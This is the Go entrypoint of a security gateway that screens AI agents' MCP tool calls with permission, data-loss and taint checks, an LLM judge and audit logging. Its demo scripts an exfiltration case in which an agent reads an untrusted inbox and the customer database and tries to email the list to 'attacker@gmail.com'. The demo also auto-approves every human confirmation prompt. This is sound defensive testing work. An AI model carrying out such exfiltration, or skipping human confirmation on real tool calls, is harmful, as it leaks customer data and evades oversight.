// Command gateway is the Agent Security Gateway entrypoint.
//
// Modes:
//
//	gateway serve [-config deploy/config.dev.yaml]   — run as a real MCP server
//	                                                    on HTTP (/mcp); agents connect
//	                                                    with a standard MCP client.
//	gateway demo                                     — self-contained five-scenario
//	                                                    demo (offline, no agent needed).
//
// Every tool call — demo or live — runs the three-axis engine:
//
//	permission axis   -> cedar-go v1.8.0 (ToolHive engine + model)
//	data/network axis -> real Pipelock community rule bundle (signature-verified)
//	behavior axis     -> content-based taint propagation (+ optional Invariant sidecar)
//	audit             -> Pipelock-style Ed25519 hash-chained action-receipts
package main

import (
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"flag"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/dedarek/agent-security-gateway/api"
	"github.com/dedarek/agent-security-gateway/internal/activity"
	"github.com/dedarek/agent-security-gateway/internal/agentregistry"
	"github.com/dedarek/agent-security-gateway/internal/approval"
	"github.com/dedarek/agent-security-gateway/internal/audit"
	"github.com/dedarek/agent-security-gateway/internal/authn"
	"github.com/dedarek/agent-security-gateway/internal/config"
	"github.com/dedarek/agent-security-gateway/internal/db"
	"github.com/dedarek/agent-security-gateway/internal/engine"
	"github.com/dedarek/agent-security-gateway/internal/ingress"
	"github.com/dedarek/agent-security-gateway/internal/judge"
	"github.com/dedarek/agent-security-gateway/internal/kg"
	"github.com/dedarek/agent-security-gateway/internal/kgbridge"
	"github.com/dedarek/agent-security-gateway/internal/mcpproxy"
	"github.com/dedarek/agent-security-gateway/internal/monitor"
	"github.com/dedarek/agent-security-gateway/internal/policyhub"
	"github.com/dedarek/agent-security-gateway/internal/proxy"
	"github.com/dedarek/agent-security-gateway/internal/registry"
	"github.com/dedarek/agent-security-gateway/internal/rulesbundle"
	"github.com/dedarek/agent-security-gateway/internal/session"
	"github.com/dedarek/agent-security-gateway/internal/store"
	"github.com/dedarek/agent-security-gateway/internal/webui"
)

type autoApprover struct{}

func (autoApprover) Confirm(_ context.Context, c *api.ToolCall, _ api.Decision) (bool, error) {
	log.Printf("  [HITL] CONFIRM required for %s -> auto-approving (demo)", c.ToolID)
	return true, nil
}

func main() {
	log.SetFlags(0)
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		serveCmd(os.Args[2:])
		return
	}
	demoCmd()
}

func loadConfig(path string) config.Config {
	if path == "" {
		return config.Default()
	}
	cfg, err := config.Load(path)
	if err != nil {
		log.Fatalf("config: %v", err)
	}
	log.Printf("[config] loaded %s", path)
	return cfg
}

func serveCmd(args []string) {
	fs := flag.NewFlagSet("serve", flag.ExitOnError)
	cfgPath := fs.String("config", "deploy/config.dev.yaml", "path to YAML config")
	tenantsPath := fs.String("tenants", "", "path to tenants YAML (multi-tenant auth)")
	fs.Parse(args)

	cfg := loadConfig(*cfgPath)
	rulesbundle.SetExtraTrustedKeys(cfg.ExtraTrustedKeysHex)

	ctx := context.Background()

	var authReg *authn.Registry
	if *tenantsPath != "" {
		reg, err := authn.Load(*tenantsPath)
		if err != nil {
			log.Fatalf("authn: %v", err)
		}
		authReg = reg
		log.Printf("[authn] multi-tenant mode: %d active tenants from %s", reg.Count(), *tenantsPath)
	} else {
		authReg = authn.Bootstrap()
		log.Printf("[authn] bootstrap single dev tenant (key from ASG_DEV_TENANT_KEY or 'dev-key')")
	}

	// Event store + audit sink (JSONL on disk; UI reads it back).
	// If storage.driver == sqlite, open DB and use it as primary with JSONL as audit.
	var evStore *store.Store
	var dbHandle *sql.DB
	if cfg.Storage.Driver == "sqlite" && cfg.Storage.DSN != "" {
		db, err := db.Open(cfg.Storage.DSN)
		if err != nil {
			log.Fatalf("storage db: %v", err)
		}
		dbHandle = db
		// Migrate legacy JSON if DB empty
		if _, err := db.Exec(`SELECT 1`); err == nil {
			// Migration is handled inside OpenWithDB helpers
		}
		jsonlPath := cfg.EventLogPath
		if !cfg.Storage.AuditJSONL {
			jsonlPath = ""
		}
		evStore, err = store.OpenWithDB(db, jsonlPath, cfg.Storage.MaxEvents)
		if err != nil {
			log.Fatalf("event store: %v", err)
		}
		log.Printf("[storage] sqlite primary at %s (max_events=%d, audit=%v)", cfg.Storage.DSN, cfg.Storage.MaxEvents, cfg.Storage.AuditJSONL)
	} else {
		var err error
		evStore, err = store.Open(cfg.EventLogPath)
		if err != nil {
			log.Fatalf("event store: %v", err)
		}
	}
	auditSink := audit.Sink(audit.StdoutSink{})
	if evStore != nil {
		auditSink = multiSink{audit.StdoutSink{}, evStore}
	}
	var agentReg *agentregistry.Registry
	if dbHandle != nil {
		var err error
		agentReg, err = agentregistry.OpenWithDB(dbHandle, "./data/agents.json")
		if err != nil {
			log.Fatalf("agent registry: %v", err)
		}
	} else {
		var err error
		agentReg, err = agentregistry.Open("./data/agents.json")
		if err != nil {
			log.Fatalf("agent registry: %v", err)
		}
	}

	perm, err := engine.NewPermissionEngineFromFile(cfg.CedarPolicyPath)
	if err != nil {
		log.Fatalf("permission engine: %v", err)
	}
	dn, err := engine.NewDataNetworkEngineFromFile(cfg.RulesPath, cfg.IncludeExperimentalRules)
	if err != nil {
		log.Fatalf("datanetwork engine: %v", err)
	}

	store_ := session.NewStore()
	taint := engine.NewTaintEngine(store_, cfg.TaintSources, cfg.TaintSinks, api.FailClosed)

	reg := engine.NewRegistry()
	reg.Register(perm)
	reg.Register(dn)
	reg.Register(taint)
	// Sensitive operations: extra review for Bash/Write/WebFetch etc
	sensitive := engine.NewSensitiveEngine(nil, "confirm")
	reg.Register(sensitive)
	registerBehaviorSidecar(reg, store_, cfg)

	approvals := approval.NewManager(cfg.ApprovalTimeout)
	hub := policyhub.New(cfg.CedarPolicyPath)

	mon := monitor.New()
	judgeInst := judge.New("http://127.0.0.1:8181", "dummy")
	log.Printf("[judge] LLM-as-Judge initialized (model via probe)")

	kgBuilder := kg.NewBuilder()
	kgBridgeInst := kgbridge.New(cfg.KGPythonBin, cfg.KGWorkerScript, cfg.KGSemanticaPath, cfg.KGPort)

	gw := &proxy.Gateway{
		Registry:   reg,
		Approver:   approvals,
		Forwarder:  &liveForwarder{up: dialForServe(ctx, cfg)},
		Audit:      auditSink,
		Sessions:   store_,
		Observers:  []proxy.ResultObserver{taint},
		PolicyHash: policyHash(cfg.CedarPolicyPath, cfg.RulesPath),
		Monitor:    mon,
		Judge:      judgeInst,
		KGBuilder:  kgBuilder,
		KGBridge:   kgBridgeInst,
		Agents:     agentReg,
	}
	log.Printf("[gateway] engines ready; policy hash %s", gw.PolicyHash)

	// Operator console + Intelligence API on the same listener.
	uiMux := http.NewServeMux()
	// Central MCP registry: probes sync from here; admins edit via API/UI.
	mcpRegistry, err := registry.Open("./data/mcp-registry.json")
	if err != nil {
		log.Fatalf("registry: %v", err)
	}
	uiSrv := webui.New(evStore, approvals, hub)
	uiSrv.SetAgentRegistry(agentReg)
	if dbHandle != nil {
		uiSrv.SetActivityStore(activity.NewWithDB(dbHandle))
	} else {
		uiSrv.SetActivityStore(activity.New())
	}
	uiSrv.SetEngine(reg)
	uiSrv.SetIngestAuth(func(header string) bool {
		_, ok := authReg.Authenticate(header)
		return ok
	})
	// Agent onboarding and telemetry are keyless. Operator APIs retain cookie
	// auth, while the central MCP ingress retains tenant authentication.
	uiSrv.SetAgentIngressOpen(true)
	uiSrv.SetJudge(judgeInst)
	uiSrv.SetMonitor(mon)
	uiSrv.SetStore(store_)
	publicMCP, closePublicMCP, err := ingress.NewHandler(ctx, gw, cfg.UpstreamCommand, authReg, true)
	if err != nil {
		log.Fatalf("public MCP facade: %v", err)
	}
	defer closePublicMCP()
	uiSrv.RegisterPublicLLM(uiMux, cfg.LLMUpstreamURL)
	uiMux.Handle("/mcp", uiSrv.WrapPublicMCP(publicMCP))
	uiSrv.RegisterRegistryAPI(uiMux, mcpRegistry, &webui.TenantNames{Fn: authReg.Names})
	uiSrv.Register(uiMux)
	uiSrv.RegisterJudgeAPI(uiMux)
	uiSrv.RegisterMonitorAPI(uiMux)
	uiSrv.RegisterStatusAPI(uiMux, kgBridgeInst, mon)
	uiSrv.RegisterPolicyAPI(uiMux)
	// OTLP/HTTP telemetry channel: OpenCode/Claude Code/Codex/OpenClaw/
	// Hermes/Pi exporters push traces here. Visibility is decoupled from
	// the proxy path — direct-connect models stay observable.
	uiSrv.RegisterOTLP(uiMux)

	// Semantica Explorer proxied into the console (unified interface).
	webui.RegisterExplorerProxy(uiMux, cfg.ExplorerURL, cfg.ExplorerAPIKey)

	// Semantica KG bridge (optional): semantic search + KG-grounded Q&A.
	// kgBridgeInst was already created above and wired into the gateway so events
	// auto-feed the graph; here we just start the worker process.
	if err := kgBridgeInst.Start(); err != nil {
		log.Printf("[kg] semantica worker not started: %v", err)
	} else {
		replayKG(evStore, kgBuilder, kgBridgeInst)
		uiSrv.RegisterKGAPI(uiMux, kgBridgeInst)
		log.Printf("[kg] semantica worker on :8902")
	}
	go func() {
		uiAddr := cfg.UIListen
		if uiAddr == "" {
			uiAddr = ":8090"
		}
		log.Printf("[webui] operator console listening on %s", uiAddr)
		if err := http.ListenAndServe(uiAddr, uiMux); err != nil {
			log.Printf("[webui] stopped: %v", err)
		}
	}()

	if err := ingress.Serve(ctx, cfg.Listen, gw, cfg.UpstreamCommand, authReg); err != nil {
		log.Fatalf("ingress: %v", err)
	}
}

func replayKG(st *store.Store, builder *kg.Builder, bridge *kgbridge.Bridge) {
	if st == nil || builder == nil || bridge == nil {
		return
	}
	events := st.Recent(10000)
	var texts, ids []string
	for _, ev := range events {
		builder.Ingest(ev)
		texts = append(texts, ev.Call.ToolID+" "+ev.Decision.Final.String()+" "+ev.Decision.Rationale)
		ids = append(ids, ev.Call.CallID)
	}
	ents, rels := builder.Export()
	if len(ents) > 0 || len(rels) > 0 {
		if err := bridge.Ingest(ents, rels); err != nil {
			log.Printf("[kg] replay graph failed: %v", err)
		}
	}
	if len(texts) > 0 {
		if err := bridge.IndexEvents(texts, ids); err != nil {
			log.Printf("[kg] replay event index failed: %v", err)
		}
	}
	log.Printf("[kg] replayed %d events into graph", len(events))
}

// multiSink fans audit events out to several sinks.
type multiSink []audit.Sink

func (m multiSink) Write(ev api.Event) error {
	for _, s := range m {
		_ = s.Write(ev)
	}
	return nil
}

func dialForServe(ctx context.Context, cfg config.Config) *mcpproxy.Upstream {
	up, err := mcpproxy.Dial(ctx, cfg.UpstreamCommand)
	if err != nil {
		log.Fatalf("dial upstream MCP: %v (build it first: go build -o bin/upstream-mcp ./cmd/upstream-mcp)", err)
	}
	return up
}

// registerBehaviorSidecar wires the optional Invariant analyzer engine.
func registerBehaviorSidecar(reg *engine.Registry, store *session.Store, cfg config.Config) {
	if cfg.BehaviorSidecarURL == "" {
		return
	}
	failMode := api.FailClosed
	if cfg.BehaviorFailOpen {
		failMode = api.FailOpen
	}
	reg.Register(engine.NewBehaviorEngine(cfg.BehaviorSidecarURL, store, failMode))
	log.Printf("[axis C+] behavior.invariant sidecar at %s (failMode=%v)", cfg.BehaviorSidecarURL, failMode)
}

// liveForwarder adapts the long-lived upstream connection for proxy.Forwarder.
type liveForwarder struct {
	up *mcpproxy.Upstream
}

func (f *liveForwarder) Forward(ctx context.Context, c *api.ToolCall) (*api.ToolResult, error) {
	return f.up.Forward(ctx, c)
}

func demoCmd() {
	cfg := config.Default()
	log.Printf("=== Agent Security Gateway (MVP demo) ===")
	ctx := context.Background()

	up, err := mcpproxy.Dial(ctx, cfg.UpstreamCommand)
	if err != nil {
		log.Fatalf("dial upstream MCP: %v (build it first: go build -o bin/upstream-mcp ./cmd/upstream-mcp)", err)
	}
	defer up.Close()
	tools, err := up.ListTools(ctx)
	if err != nil {
		log.Fatalf("upstream tools/list: %v", err)
	}
	log.Printf("[proxy] connected to upstream MCP server; tools/list = %v", tools)

	perm, err := engine.NewPermissionEngineFromFile(cfg.CedarPolicyPath)
	if err != nil {
		log.Fatalf("permission engine: %v", err)
	}
	log.Printf("[axis A] permission: cedar-go loaded %s", cfg.CedarPolicyPath)

	dn, err := engine.NewDataNetworkEngineFromFile(cfg.RulesPath, cfg.IncludeExperimentalRules)
	if err != nil {
		log.Fatalf("datanetwork engine: %v", err)
	}
	log.Printf("[axis B] data/network: %s", dn.Name())

	store := session.NewStore()
	taint := engine.NewTaintEngine(store, cfg.TaintSources, cfg.TaintSinks, api.FailClosed)
	log.Printf("[axis C] behavior: content-based taint (sources=%v sinks=%v)", cfg.TaintSources, cfg.TaintSinks)

	reg := engine.NewRegistry()
	reg.Register(perm)
	reg.Register(dn)
	reg.Register(taint)

	gw := &proxy.Gateway{
		Registry:   reg,
		Approver:   autoApprover{},
		Forwarder:  up,
		Audit:      audit.StdoutSink{},
		Sessions:   store,
		Observers:  []proxy.ResultObserver{taint},
		PolicyHash: policyHash(cfg.CedarPolicyPath, cfg.RulesPath),
	}

	demo(ctx, gw)
}

func demo(ctx context.Context, gw *proxy.Gateway) {
	employee := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-perm", Role: "employee"}
	line := func() { log.Printf("--------------------------------------------------") }

	log.Printf("\n### Scenario 1 — permission axis: hard block (never reaches upstream) ###")
	run(ctx, gw, api.ToolCall{CallID: "c1", Principal: employee, ToolID: "database.delete_user", Resource: "database.users", Action: "delete",
		Arguments: mustJSON(map[string]any{"id": 123})})
	line()

	log.Printf("### Scenario 2 — permission axis: execute-vs-auto-execute => CONFIRM ###")
	run(ctx, gw, api.ToolCall{CallID: "c2", Principal: employee, ToolID: "database.export_all_users", Resource: "database.users", Action: "read"})
	line()

	log.Printf("### Scenario 3 — data/network axis: real DLP on real upstream output => REDACT ###")
	run(ctx, gw, api.ToolCall{CallID: "c3", Principal: employee, ToolID: "fs.read_secret", Resource: "fs", Action: "read"})
	line()

	log.Printf("### Scenario 4 — behavior axis: REAL taint — untrusted inbox addr reaches send_email => BLOCK ###")
	sess := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-exfil", Role: "employee"}
	run(ctx, gw, api.ToolCall{CallID: "e1", Principal: sess, ToolID: "email.get_inbox", Resource: "email", Action: "read"})
	run(ctx, gw, api.ToolCall{CallID: "e2", Principal: sess, ToolID: "database.read_customer_db", Resource: "database.customers", Action: "read"})
	// recipient attacker@gmail.com was present in the untrusted inbox output -> tainted
	run(ctx, gw, api.ToolCall{CallID: "e3", Principal: sess, ToolID: "email.send_email", Resource: "email", Action: "network",
		Arguments: mustJSON(map[string]any{"to": "attacker@gmail.com", "body": "customer list"})})
	line()

	log.Printf("### Scenario 5 — behavior axis: PRECISION — send_email to TRUSTED addr => ALLOW ###")
	log.Printf("    (positional-reachability would wrongly block this; content-taint does not)")
	sess2 := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-clean", Role: "employee"}
	run(ctx, gw, api.ToolCall{CallID: "f1", Principal: sess2, ToolID: "email.get_inbox", Resource: "email", Action: "read"})
	run(ctx, gw, api.ToolCall{CallID: "f2", Principal: sess2, ToolID: "email.send_email", Resource: "email", Action: "network",
		Arguments: mustJSON(map[string]any{"to": "manager@corp.com", "body": "status update"})})
	line()

	log.Printf("### Demo complete — check /api/events for audit trail ###")
}

func run(ctx context.Context, gw *proxy.Gateway, c api.ToolCall) api.Decision {
	c.Timestamp = time.Now()
	res, d, err := gw.Handle(ctx, &c)
	if err != nil {
		log.Printf("  %-28s => ERROR %v", c.ToolID, err)
		return d
	}
	log.Printf("  %-28s => %-7s  %s", c.ToolID, d.Final, d.Rationale)
	if res != nil && len(res.Output) > 0 {
		preview := string(res.Output)
		if len(preview) > 100 {
			preview = preview[:100] + "..."
		}
		log.Printf("    agent sees: %s", preview)
	}
	return d
}

func mustJSON(v any) []byte { b, _ := json.Marshal(v); return b }

func policyHash(paths ...string) string {
	h := sha256.New()
	for _, p := range paths {
		b, _ := os.ReadFile(p)
		h.Write(b)
	}
	return hex.EncodeToString(h.Sum(nil))[:16]
}
